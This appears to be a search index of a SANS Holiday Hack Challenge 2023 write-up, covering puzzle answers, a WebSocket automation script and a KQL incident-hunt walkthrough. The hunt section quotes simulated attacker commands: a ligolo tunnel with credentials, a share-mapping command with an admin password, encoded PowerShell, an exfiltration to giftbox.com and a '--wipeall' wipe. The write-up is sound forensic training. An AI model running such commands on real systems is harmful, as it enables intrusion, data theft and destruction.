{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>Welcome everyone to my 2023 SANS Holiday Hack Challange write-up based on Holiday Hack 2023 Challanges!.</p> <p>There are 3 main sections. The page which contains introduction, answers and all extras found during this journey! Extras section contains Bonus and Easter eggs. </p> <p>I had oportunity to create GPT Apps using ChatGPT which helped me out during investigations of phishing mails in Phish Detection Agency and AI Halucinations in Reportinator. Artificial intelligence proved instrumental in solving puzzles during various missions including Missile Diversion. ChatGPT was employed to develop code for automating fishing activities Bonus , utilizing WebSockets technology.</p>"},{"location":"#destinations","title":"Destinations","text":"<p>This year we have been situated across sea encompassing five distinct islands. </p>"},{"location":"#christmas-island","title":"Christmas Island","text":"<ul> <li>Orientation </li> <li>Frosty's Beach</li> <li>Santa's Surf Shack</li> <li>Rudolph's Rest Resort</li> <li>Resort Lobby</li> </ul>"},{"location":"#island-of-misfit-toys","title":"Island of Misfit Toys","text":"<ul> <li>Scaredy Kite Heights</li> <li>Ostrich Saloon</li> <li>Squarewheel Yard</li> <li>Tarnished Trove</li> </ul>"},{"location":"#film-noir-island","title":"Film Noir Island","text":"<ul> <li>Chiaroscuro City</li> <li>Gumshoe Alley PI Office</li> <li>The Blacklight District</li> </ul>"},{"location":"#pixel-island","title":"Pixel Island","text":"<ul> <li>Rainraster Cliffs</li> <li>Driftbit Grotto</li> </ul>"},{"location":"#steampunk-island","title":"Steampunk Island","text":"<ul> <li>Brass Bouy Port</li> <li>Coggoggle Marina</li> <li>Rusty Quay</li> </ul>"},{"location":"#space-island","title":"Space Island","text":"<ul> <li>Spaceport Point</li> <li>Cape Cosmic</li> <li>Zenith SGS</li> </ul>"},{"location":"#answers","title":"Answers","text":"<p>1. Holiday Hack Orientation - </p> <p>answer</p> <p>2. Snowball Fight - </p> <p>window.player.body.height=1</p> <p>3. Linux 101 - </p> <p>Congratulations, you caught all the trolls and retrieved all the presents!</p> <p>4. Reportinator - </p> <p>Halucinations found in Report 3,6,9</p> <p>5. Azure 101 - </p> <p>Great, you did it all!</p> <p>6. Luggage Lock -</p> <p>42[\"message\",{\"Type\":\"Open\",\"Success\":\"True\",\"Token\":{\"hash\":\"63867c655eaa6469bb28a62688c4e1b7ec0c435ef8ee67d9cf24cac953b8148d\",\"resourceId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"},\"PlayerId\":\"5353ac49-2534-4de6-b8ed-9ef09dd76289\"}]</p> <p>7. Linux PrivEsc - </p> <p>santa</p> <p>8. Faster Lock Combination - </p> <p>Lock open</p> <p>9. Game Cartridges: Vol 1 - </p> <p>Fixed QR code</p> <p>10. Game Cartridges: Vol 2 - </p> <p>GL0RY</p> <p>11. Game Cartridges: Vol 3 - </p> <p>!tom+elf!</p> <p>12. Na'an - </p> <p>NAN</p> <p>13. KQL Kraken Hunt - </p> <p>Beware the Cube that Wombles</p> <p>14. Phish Detection Agency - </p> <p>[\"victor.davis@geeseislands.com\",\"xavier.jones@geeseislands.com\",\"steven.gray@geeseislands.com\",\"laura.green@geeseislands.com\",\"nancy@geeseislands.com\",\"rachel.brown@geeseislands.com\",\"ursula.morris@geeseislands.com\",\"quincy.adams@geeseislands.com\",\"michael.roberts@geeseislands.com\",\"oliver.thomas@geeseislands.com\"]</p> <p>15. Hashcat - </p> <p>IluvC4ndyC4nes!</p> <p>16. Elf Hunt - </p> <p>Score 75 points</p> <p>17. Certificate SSHenanigans - </p> <p>Gingerbread</p> <p>18. The Captain's Comms - </p> <p>10426:HZ, 1224L:MMDD, 1200:HHMM </p> <p>19. Active Directory - </p> <p>Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way. </p> <p>20. Space Island Door Access Speaker - </p> <p>Doors open </p> <p>21. Camera Access - </p> <p>Conquer Holiday Season! </p> <p>22. Missile Diversion - </p> <p>SQL Update completed. </p>"},{"location":"#conclusion","title":"Conclusion","text":"Narrative <p>A tale of a yuletide trip That started from a tropic port, Aboard this tiny ship Santa and his helpful elves To Geese Islands did go Continuing their merry work O'er sand instead of snow New this year: a shiny tool The elves logged in with glee What makes short work of many tasks? It's ChatNPT. It's ChatNPT From images to APIs This AI made elves glad But motivations were unknown So was it good or bad? Could it be that NPT Was not from off-the-shelf? Though we'll forgive and trust again We'd found a naughty elf This fancy AI tool of ours With all our work remained Not good or bad, our online friend Just did as it was  Surely someone's taint must be Upon our AI crutch Yes indeed, this bold new  Bore Jack Frost's icy touch Though all's returned to steady state There's one thing that we know We'll all be needed once again When Santa's back on snow </p> <p>Appreciation is extended to the entire team for their continued commitment to bringing fun challenges each year!</p> <p></p>"},{"location":"bonus/","title":"Bonus - Fishing Mastery","text":""},{"location":"bonus/#objective","title":"Objective","text":"<p>Fishing objective!</p> <p>Request</p> <p>Catch twenty different species of fish that live around Geese Islands. When you're done, report your findings to Poinsettia McMittens on the Island of Misfit Toys.</p> Poinsettia McMittens <p>Excuse me, but you're interrupting my fishing serenity. Oh, you'd like to know how to become as good at fishing as I am? Well, first of all, thank you for noticing my flair for fishing. It's not just about looking good beside the lake, you know.</p> Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p> Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p>"},{"location":"bonus/#solution","title":"Solution","text":"<p>In source code we have found interesting link, which will be required to catch some rare fishes: <pre><code>&lt;!-- &lt;a href='fishdensityref.html'&gt;[DEV ONLY] Fish Density Reference&lt;/a&gt; --&gt;\n</code></pre></p> <p>First we started inspecting source code and console tools.</p> <p>We can see messages sent bidirectionally to this WebSoscket endpoint: wss://2023.holidayhackchallenge.com/sail?dockSlip=4606a58c-ccff-4bbf-b9c7-66bcba107161.</p> <p>After inspecing WS communication we can see interesting messages whenever we catch a fish.</p> <pre><code>e:{\"65139\":{\"uid\":65139,\"username\":\"LS1942\",\"x\":790.122627300308,\"y\":1669.9187716418694,\"o\":1,\"vx\":0,\"vy\":0,\"config\":{\"colors\":[\"plaid\",\"black\",\"blue\"],\"progress\":[false,false,false,true,true,true]},\"fishCaught\":[{\"name\":\"JellyChip CuddleSwimmer\",\"description\":\"&lt;-- removed --&gt;\",\"hash\":\"f71ba29843c1d46325da6e8ec821896b\"}],\"bearing\":\"spi-coggogglemarina\",\"canFish\":true,\"ports\":[\"ci-rudolphsrest\",\"imt-squarewheelyard\",\"imt-scaredykiteheights\",\"imt-tarnishedtrove\",\"spi-coggogglemarina\",\"spi-brassbouyport\",\"pi-rainrastercliffs\",\"si-spaceportpoint\",\"staging\",\"fni-theblacklightdistrict\",\"ci-frostysbeach\",\"spi-rustyquay\"],\"showOthers\":true,\"keyState\":0,\"colors\":[\"plaid\",\"black\",\"blue\"],\"progress\":[false,false,false,true,true,true],\"fishing\":true,\"onTheLine\":\"The Speckled Pizzafin Fizzflyer\"}}\n</code></pre> <p>We need to make sure to properly decode those json messages and monitor onTheLine value whenever received.</p> <p>To catch most rare fish (Piscis Cyberneticus Skodo) we used heatmap located here: https://2023.holidayhackchallenge.com/sea/fishdensityref.html.  The existing JavaScript script was overridden with a custom version, this piece of code was modified: img src=\"assets/noise/Piscis Cyberneticus Skodo.png\"</p> <pre><code>    const ImageAssets = {\n    ship: 'assets/ship.png',\n    rod: 'assets/rod.png',\n    roddown: 'assets/roddown.png',\n    bobber: 'assets/bobber.png',\n    shipclip: 'assets/shipclip.png',\n    blocks: 'assets/blocks.png',\n    ocean: 'assets/ocean.png',\n    detail: 'assets/island_detail.png',\n    buoy: 'assets/buoy.png',\n    wave: 'assets/wave.png',\n    bump: 'assets/bump.png',\n    minimap: 'assets/minimap.png',\n    miniboat: 'assets/miniboat.png',\n    shadow: 'assets/shadow.png',\n    startflag: 'assets/startflag.png',\n    finishflag: 'assets/finishflag.png',\n    arrow: 'assets/arrow.png',\n};\n</code></pre> <p>This is exact place where we need to hunt for our rare specie. Heat map black colour mean you won't be able to hunt fish so we need to go white spot.</p> <p></p> <p>Below we can see JS script for TamperMonkey extension.  ChatGPT was used to develop it.</p> <p>Example prompts: <code>write websocket script for tampermonkey extension to interact with websockets on url wss://2023.holidayhackchallenge.com/</code></p> <pre><code>// ==UserScript==\n// @name         WebSocket Hook Script with Selective JSON Processing\n// @namespace    http://tampermonkey.net/\n// @version      1.0\n// @description  Hook into existing WebSocket connections, selectively process JSON messages\n// @author       Your Name\n// @match        https://2023.holidayhackchallenge.com/*\n// @grant        none\n// @run-at       document-start\n// ==/UserScript==\n\n(function() {\n    'use strict';\n\n    var OriginalWebSocket = window.WebSocket;\n    var webSockets = [];\n\nvar reelSent = false;\nvar caughtFishList = [];\n\nfunction searchOnTheLine(obj) {\n    for (var key in obj) {\n        if (typeof obj[key] === 'object') {\n            // If the current value is an object, recursively search it\n            searchOnTheLine(obj[key]);\n        } else if (key === 'onTheLine') {\n            // If the key is 'onTheLine', check its value\n            if (obj[key] !== false) {\n                console.log(obj[key]);\n                // If the value is not false, send a \"cast\" message\n                sendMessage('reel');\n                reelSent = true;\n\n                // Set a timeout to send \"cast\" 5 seconds after sending \"reel\"\n                setTimeout(function () {\n                    if (reelSent) {\n                        sendMessage('cast');\n\n                    }\n                }, 5000);\n            }\n        } else if (key === 'fishCaught') {\n            // If the key is 'fishCaught', handle it using a separate function\n            handleFishCaught(obj[key]);\n        }\n    }\n}\n\nfunction handleFishCaught(fishCaughtData) {\n    caughtFishList.push(fishCaughtData); // Add the caught fish to the list\n    console.log(fishCaughtData);\n    // You can perform additional processing or checks here as needed\n}\n\nwindow.WebSocket = function(url, protocols) {\n    var ws = protocols ? new OriginalWebSocket(url, protocols) : new OriginalWebSocket(url);\n    webSockets.push(ws);\n\n    ws.addEventListener('message', function(event) {\n        // Check if the message might be valid JSON (e.g., starts with '{' after removing two characters)\n        if (event.data.slice(2).trim().startsWith('{')) {\n            try {\n                // Remove the first two characters and parse the rest as JSON\n                var jsonData = JSON.parse(event.data.slice(2))\n\n                // Search for \"onTheLine\" anywhere in the JSON structure\n                searchOnTheLine(jsonData);\n\n            } catch (e) {\n                console.error('Error processing JSON message:', e);\n            }\n        } else {\n            // If not JSON, you can log or ignore these messages\n        }\n    });\n\n    return ws;\n};\n    for (var prop in OriginalWebSocket) {\n        if (OriginalWebSocket.hasOwnProperty(prop)) {\n            window.WebSocket[prop] = OriginalWebSocket[prop];\n        }\n    }\n\n    function sendMessage(message) {\n        if (webSockets.length &gt; 0 &amp;&amp; webSockets[0].readyState === WebSocket.OPEN) {\n            webSockets[0].send(message);\n        } else {\n            console.error('No active WebSocket connection found.');\n        }\n    }\n\n    setTimeout(function() {\n        sendMessage('cast');\n    }, 5000);\n\n})();\n</code></pre> <p>And here we go with our final fish!</p> <p></p> <p>Answer</p> <p>Catched 171 Fish species.</p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":"<p>List of all Easter Eggs which i was able to find:</p>"},{"location":"easter_eggs/#jason","title":"Jason","text":"<p>Found out Jason is not dead!</p> <p></p>"},{"location":"easter_eggs/#courious","title":"Courious","text":"<p>Interesting href once we log-out</p> <p>https://2023.holidayhackchallenge.com/%E2%9D%84%F0%9F%8E%81%E2%9B%84%F0%9F%8E%84%F0%9F%8E%85%E2%9D%84</p> <p></p> <p>You're curious.</p><p>We like that. :)</p>"},{"location":"objectives/o1/","title":"Holiday Hack Orientation","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Request</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge! I'm Jingle Ringford, one of Santa's many elves. Santa asked me to meet you here and give you a short orientation to this festive event. Before you head back to your boat, I'll ask you to accomplish a few simple tasks.</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>For this task, it was necessary to enter the correct answer into the terminal in order to proceed.</p> <p></p> <p>Answer</p> <p>answer</p>"},{"location":"objectives/o1/#response","title":"Response","text":"<p>Jingle Ringford</p> <p>Perfect! Your orientation is now complete! Head back to your boat or click on the anchor icon on the left of the screen to set sail for Frosty's Beach where Santa's waiting for you. I've updated your boat's compass to guide the way. As you sail to each island, talk to the goose of that island to receive a colorful lei festooning the masts on your ship. Safe travels my friend and remember, relax, enjoy the sun, and most importantly, have FUN!</p>"},{"location":"objectives/o10/","title":"Game Cartridges: Vol 3","text":"<p>Difficulty:  Direct link: Objective Terminal</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Find the third Gamegosling cartridge and beat the game</p> Angel Candysalt <p>The life of a treasure hunter isn't easy, but it sure is exciting! Oh it's a video game, I love video games! But you've claimed this treasure, nicely done. Now, about those secrets I've been told. They're pretty cryptic, but they are. Hopefully that helps with something!</p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Gameboy 3 <p>1) This one is a bit long, it never hurts to save your progress! 2) 8bit systems have much smaller registers than you\u2019re used to. 3) Isn\u2019t this great?!? The coins are OVERFLOWing in their abundance.</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":"<p>The place where we can find Cartridge vol 3.</p> <p></p> <p>First of all we need to download GameBoy ROM to emulate it locally. This can be found using Network tab in Chrome. <pre><code>https://gamegosling.com/vol3-7bNwQKGBFNGQT1/rom/game.gb\n</code></pre></p> <p>For this challenge, we chose a GameBoy Advance emulator to save the game's progress and easily create save files, which we will investigate.</p> <p>We are going to check what is format of the save. We can see .sav extension and recommendation from ChatGPT to check it using Hex Editor.</p> <p>I have generated few saves with different amount of coins( ex 666 , 555, 888). Thanks to this move i was able to spot offset with data which we modify.</p> <p></p> <p>Once we restored save we were able to gain 999 coins which were required to complete game.</p> <p></p> <p>Total amount of coins is correct:</p> <p></p> <p>Success! We got the flag:</p> <p></p> <p>Answer</p> <p>!tom+elf!</p>"},{"location":"objectives/o10/#response","title":"Response","text":"<p>Angel Candysalt</p> <p>You have all three? Wow, you must be the greatest treasure hunter that ever lived!</p>"},{"location":"objectives/o11/","title":"Na'an","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o11/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles <p>Copy the first part of the conversation with Elf Name here Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it. Step right up, test your wit! These cards could be your ticket to fortune. Trust me, I've got a good eye for winners, and you've got the look of luck about you. Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python. The name of the game is to bamboozle the dealer. So whad'ya think? Are you clever enough?</p>"},{"location":"objectives/o11/#hints","title":"Hints","text":"Stump the Chump <p>Try to outsmart Shifty by sending him an error he may not understand.</p> The Upper Hand <p>Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p>"},{"location":"objectives/o11/#solution","title":"Solution","text":"<p>First we found information application is written in Python.</p> <p></p> <p>After inserting NAN value into the middle card we confused game and won!</p> <p></p> <p>https://discuss.python.org/t/nan-breaks-min-max-and-sorting-functions-a-solution/2868</p> <p>Python isn\u2019t \u201ctype safe\u201d, it\u2019s \u201cduck typed\u201d. It's not IEEE754 compliant.</p> <p>The good news: easily fixable by a competent dev on a case-by-case basis (like any injection attack mitigation) using isnan() wisely and most likely failure modes are going to be logic flaws or ValueError crashes. Bad news: it's VERY dangerous to test in prod.</p> <p>Answer</p> <p>NAN</p>"},{"location":"objectives/o11/#response","title":"Response","text":"<p>Shifty McShuffles</p> <p>Well, you sure are more clever than most of the tourists that show up here.</p>"},{"location":"objectives/o12/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o12/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here. I've got a network infection case on Film Noir Island that needs your expertise. Seems like someone clicked a phishing link within a client's organization, and trouble's brewing. I'm swamped with cases, so I need an extra pair of hands. You up for the challenge? You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this incident. Before you start, you'll need to create a free cluster. Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open. Remember, kid, time is of the essence. The sooner we can resolve this issue, the better. If you run into any problems, just give me a holler, I've got your back. Good hunting, and let's bring this cyber criminal to justice. Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/o12/#hints","title":"Hints","text":"KQL Tutorial <p>Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p> Outbound Connections <p>Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!</p>"},{"location":"objectives/o12/#solution","title":"Solution","text":"<p>To answer those questions we had to use Kusto Query Language</p> <p>KQL Query Reference</p> <p>https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference</p> <p>Onboarding</p> <p>Here's a little puzzle to warm you up with KQL and feel the pulse of the collected data. The Geese Islands network boasts a robust team putting in some serious hustle, and you can unmistakably witness their dedication mirrored in the tasks they bring to life. The delightful keyboard clicks in the morning, truly something to love, don't you agree? Now, presenting a snappy challenge: figure out the number of Craftsperson Elf's in the organization that are working from laptops.</p> <p>Onboarding: How many Craftperson Elf's are working from laptops?</p> <pre><code>Employees \n|   where hostname has \"LAPTOP\" and role == \"Craftsperson Elf\"\n</code></pre> <p>Answer</p> <p>25</p>"},{"location":"objectives/o12/#case-1","title":"Case 1","text":"<p>Case1: Welcome to Operation Giftwrap: Defending the Geese Island network</p> <p></p> <p>KQL Query: <pre><code>Email\n| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'\n| summarize count() by recipient, link, sender, subject, timestamp\n</code></pre></p> <p>Answers</p> <p>alabaster_snowball@santaworkshopgeeseislands.org  cwombley@gmail.com  [EXTERNAL] Invoice foir reindeer food past due</p>"},{"location":"objectives/o12/#case-2","title":"Case 2","text":"<p>Case2: Someone got phished! Let's dig deeper on the victim...</p> <p></p> <p>KQL Query: <pre><code>Employees\n| where name contains \"alabaster\"\n</code></pre></p> <p>Answers</p> <p>Head Elf  Y1US-DESKTOP 10.10.0.4</p>"},{"location":"objectives/o12/#case-3","title":"Case 3","text":"<p>Case3: That's not good. What happened next?</p> <p></p> <p>KQL Query which we used to find answers: What time did Alabaster click on the malicious link? <pre><code>OutboundNetworkEvents\n| where src_ip ==\"10.10.0.4\"\n</code></pre> What file is dropped to Alabaster's machine shortly after he downloads the malicious file? <pre><code>FileCreationEvents\n| where hostname == \"Y1US-DESKTOP\"\n</code></pre></p> <p>Answers</p> <p>2023-12-02T10:12:42Z giftwrap.exe</p>"},{"location":"objectives/o12/#case-4","title":"Case 4","text":"<p>Case4: A compromised host! Time for a deep dive.</p> <p></p> <p>KQL Query: <pre><code>ProcessEvents\n| where hostname == \"Y1US-DESKTOP\"\n</code></pre></p> <p>OUTPUT on destination IP:</p> <p><pre><code>\"timestamp\": 2023-12-02T11:11:29Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": \"ligolo\" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,\n\"process_name\": ligolo,\n\"process_hash\": e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n</code></pre> OUTPUT on share enumartion timestamp:</p> <p><pre><code>\"timestamp\": 2023-12-02T16:51:44Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": net share,\n\"process_name\": net.exe,\n\"process_hash\": 8b5b1556ba468035a37b40d8ea42a4bff252f4502b97c52fcacb3ba269527a57,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n</code></pre> OUTPUT on hostname of the system the attacker moved laterally to? <pre><code>\"timestamp\": 2023-12-24T15:14:25Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": cmd.exe /C net use \\\\NorthPolefileshare\\c$ /user:admin AdminPass123,\n\"process_name\": cmd.exe,\n\"process_hash\": bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n</code></pre></p> <p>Answers Case 4</p> <p>113.37.9.17  2023-12-02T16:51:44Z  NorthPolefileshare</p>"},{"location":"objectives/o12/#case-5","title":"Case 5","text":"<p>Case5: A hidden message</p> <p></p> <p>KQL Query: <pre><code>ProcessEvents\n| where process_commandline has \"C:\\\\Windows\\\\System32\\\\powershell.exe\" and hostname == \"Y1US-DESKTOP\"\n</code></pre> Q1 When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</p> <p>OUTPUT Q1</p> <p><pre><code>\"timestamp\": 2023-12-24T16:07:47Z,\n\"parent_process_name\": cmd.exe,\n\"parent_process_hash\": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,\n\"process_commandline\": C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn,\n\"process_name\": powershell.exe,\n\"process_hash\": 6a2ecb71f664280de86832553191d1e70335f1bcdbb756e041de8d1072819885,\n\"hostname\": Y1US-DESKTOP,\n\"username\": alsnowball\n</code></pre> Q2 What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)</p> <p>Decoded output and answer is: NaughtyNiceList.txt <pre><code>'' join- )}]0[_${% | '' split- 'powershell.exe -c Copy-Item \\\\NorthPolefileshare\\c$\\MissionCritical\\NaughtyNiceList.txt C:\\Desktop\\NaughtyNiceList.txt' (\"\n</code></pre> Q3 The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</p> <p>For this challange we decoded ouput of next powershell encrypted data. To decrypt it i used chatGPT to decode ascii characters</p> <pre><code>ascii_values = [100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101]\ndecoded_string = ''.join(chr(value) for value in ascii_values)\nprint(decoded_string)\n</code></pre> <p>downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\\file</p> <p>Answers Case 5</p> <p>2023-12-24T16:07:47Z NaughtyNiceList.txt giftbox.com</p>"},{"location":"objectives/o12/#case-6","title":"Case 6","text":"<p>The final step!</p> <p></p> <p>KQL Query: <pre><code>ProcessEvents\n| where process_commandline has \"C:\\\\Windows\\\\System32\\\\powershell.exe\" and hostname == \"Y1US-DESKTOP\"\n</code></pre></p> <p>Q1 What is the name of the executable the attackers used in the final malicious command?</p> <p>In this case we also used CyberChef to decode encrypted script</p> <pre><code>\"process_commandline\": C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=,\n</code></pre> <p>C:\\Windows\\System32\\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$</p> <p>Q2 What was the command line flag used alongside this executable?</p> <p>Answers Case 6</p> <p>downwithsanta.exe --wipeall</p> <p>To earn credit for your fantastic work, return to the Holiday Hack Challenge and enter the secret phrase which is the result of running this query: <pre><code>print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')\n</code></pre></p> <p>Answer</p> <p>Beware the Cube that Wombles</p>"},{"location":"objectives/o12/#response","title":"Response","text":"<p>Tangle Coalbox</p> <p>I had my doubts, but you've proven your worth. That phishing scheme won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess. So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/o13/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o13/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought... A cybersecurity incident right in the middle of this stakeout. Seems we have a flood of unusual emails coming in through ChatNPT. Got a nagging suspicion it isn't catching all the fishy ones. You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT. Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud. We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it? I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/o13/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide. https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/</p>"},{"location":"objectives/o13/#solution","title":"Solution","text":"<p>In this objective we are requested to find all mails which are potentialy suspicious. For this purpose we will explore DMARC, DKIM and SPF authentication methods.</p> <p></p> <p>Cloudflare explanation</p> <p>DMARC, DKIM, and SPF are three email authentication methods. Together, they help prevent spammers, phishers, and other unauthorized parties from sending emails on behalf of a domain* they do not own. DKIM and SPF can be compared to a business license or a doctor's medical degree displayed on the wall of an office \u2014 they help demonstrate legitimacy. Meanwhile, DMARC tells mail servers what to do when DKIM or SPF fail, whether that is marking the failing emails as \"spam,\" delivering the emails anyway, or dropping the emails altogether. Domains that have not set up SPF, DKIM, and DMARC correctly may find that their emails get quarantined as spam, or are not delivered to their recipients. They are also in danger of having spammers impersonate them.</p> <p>During the analysis of in BURP Suite, we identified the specific method utilized for sending requests to the website.</p> <pre><code>POST /check-status HTTP/2\nHost: hhc23-phishdetect-dot-holidayhack2023.ue.r.appspot.com\n\n[\"victor.davis@geeseislands.com\",\"jason.brown@geeseislands.com\",\"wendy.mitchell@geeseislands.com\",\"steven.clark@geeseislands.com\",\"harry.potter@geeseislands.com\",\"john.doe@geeseislands.com\",\"uma.foster@geeseislands.com\",\"steven.gray@geeseislands.com\",\"patricia.johnson@geeseislands.com\",\"laura.green@geeseislands.com\",\"grace.lee@geeseislands.com\",\"nancy@geeseislands.com\",\"victor.harris@geeseislands.com\",\"rachel.brown@geeseislands.com\",\"karen.evans@geeseislands.com\",\"ursula.morris@geeseislands.com\",\"quincy.adams@geeseislands.com\",\"isabella.martin@geeseislands.com\",\"oliver.hill@geeseislands.com\",\"nancy.wilson@geeseislands.com\",\"michael.roberts@geeseislands.com\",\"alice.smith@geeseislands.com\",\"frank.harrison@geeseislands.com\",\"xavier.edwards@geeseislands.com\",\"oliver.thomas@geeseislands.com\",\"emily.white@geeseislands.com\",\"teresa.green@geeseislands.com\"]\n</code></pre> <p>and RESPONSE:</p> <pre><code>HTTP/2 400 Bad Request\nContent-Type: application/json\n\n{\n    \"message\":\"Lists do not match\"\n}\n</code></pre> <p>Let's try to review the list.</p> <p>Once we found all Phishing mails, final POST message was as below:</p> <pre><code>[\"victor.davis@geeseislands.com\",\"xavier.jones@geeseislands.com\",\"steven.gray@geeseislands.com\",\"laura.green@geeseislands.com\",\"nancy@geeseislands.com\",\"rachel.brown@geeseislands.com\",\"ursula.morris@geeseislands.com\",\"quincy.adams@geeseislands.com\",\"michael.roberts@geeseislands.com\",\"oliver.thomas@geeseislands.com\"]\n</code></pre> <p>And web server response:</p> <p><pre><code>HTTP/2 200 OK\nContent-Type: application/json\n{\"hash\":\"2460331dfcc0f7015994861bb4f5e46846ffc8f65da32f360937082373948d8a\",\"resourceId\":\"ad424a52-1fcc-45dc-81e5-8f40aa33551b\"}\n</code></pre> </p> <p>Answer</p> <pre><code>[\"victor.davis@geeseislands.com\",\"xavier.jones@geeseislands.com\",\"steven.gray@geeseislands.com\",\"laura.green@geeseislands.com\",\"nancy@geeseislands.com\",\"rachel.brown@geeseislands.com\",\"ursula.morris@geeseislands.com\",\"quincy.adams@geeseislands.com\",\"michael.roberts@geeseislands.com\",\"oliver.thomas@geeseislands.com\"]\n</code></pre>"},{"location":"objectives/o13/#2nd-alternative","title":"2nd Alternative","text":"<p>ChatGPT code</p> <p>I have also tried to leverage chatGPT to develop python script to bruteforce answer, but after 1000 requests i give up.</p> <pre><code>import requests\nimport itertools\nimport time\n\n# Define your list of email addresses\nemail_addresses = [\"david.jones@geeseislands.com\",\"victor.davis@geeseislands.com\",\"laura.moore@geeseislands.com\",\"quentin.adams@geeseislands.com\"]\n# URL and headers for the POST request\nurl = \"https://hhc23-phishdetect-dot-holidayhack2023.ue.r.appspot.com/check-status\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Host\": 